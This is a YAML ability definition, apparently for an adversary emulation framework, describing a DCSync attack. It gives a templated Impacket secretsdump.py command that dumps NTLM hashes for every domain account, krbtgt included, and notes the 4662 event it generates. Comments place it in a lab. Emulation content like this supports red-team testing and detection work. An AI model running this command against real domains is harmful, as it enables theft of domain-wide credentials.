---
- id: c1a1e001-0004-4a1a-9a11-000000000004
  name: DCSync via Impacket secretsdump
  description: |
    Abuses the DS-Replication-Get-Changes-All extended right to request
    directory replication data from a domain controller using Impacket's
    secretsdump.py, dumping NTLM hashes for all domain accounts including
    krbtgt. Generates 4662 (Directory Service Access) events on the domain
    controller where the requesting principal is not itself a DC.
  tactic: credential-access
  technique:
    attack_id: T1003.006
    name: "OS Credential Dumping: DCSync"
  platforms:
    linux:
      sh:
        command: |
          python3 secretsdump.py #{domain.name}/#{creds.user}:#{creds.pass}@#{dc.ip} -just-dc-ntlm -outputfile dcsync_dump
  requirements: []
  privilege: Elevated
  repeatable: true
  singleton: false

  # Note: no `parsers:` block, same reasoning as Kerberoasting ability.
  # Requires the account used (creds.user) to hold or have been granted
  # replication rights (e.g. via prior privilege escalation or a
  # deliberately misconfigured service account in the lab).
